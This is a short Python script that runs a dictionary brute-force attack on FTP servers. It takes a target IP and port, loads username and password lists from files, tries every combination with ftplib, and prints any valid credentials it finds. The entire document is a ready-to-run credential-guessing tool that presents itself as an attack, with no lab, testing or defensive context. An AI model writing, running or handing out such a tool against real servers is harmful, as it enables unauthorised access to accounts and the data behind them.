from ftplib import FTP
import socket

def ftp_brute_force(target_ip, port, userlist, passlist):
    print(f"Starting FTP brute force on {target_ip}:{port}")
    with open(userlist, 'r') as users, open(passlist, 'r') as passwords:
        usernames = [u.strip() for u in users.readlines()]
        passwords = [p.strip() for p in passwords.readlines()]

    for user in usernames:
        for pwd in passwords:
            try:
                ftp = FTP()
                ftp.connect(target_ip, port, timeout=5)
                ftp.login(user=user, passwd=pwd)
                print(f"[SUCCESS] Username: {user} | Password: {pwd}")
                ftp.quit()
                return  # Stop after first success (optional)
            except (socket.timeout, ConnectionRefusedError):
                print("[ERROR] Connection issue. Check the server status.")
                return
            except Exception as e:
                # Login failed or other error
                print(f"[FAILED] Username: {user} | Password: {pwd}")
    print("Brute force attack finished. No valid credentials found.")

if __name__ == "__main__":
    target_ip = input("Enter FTP Server IP: ").strip()
    port = input("Enter FTP Server Port (default 21): ").strip()
    port = int(port) if port else 21

    userlist = input("Enter path to username list file: ").strip()
    passlist = input("Enter path to password list file: ").strip()

    ftp_brute_force(target_ip, port, userlist, passlist)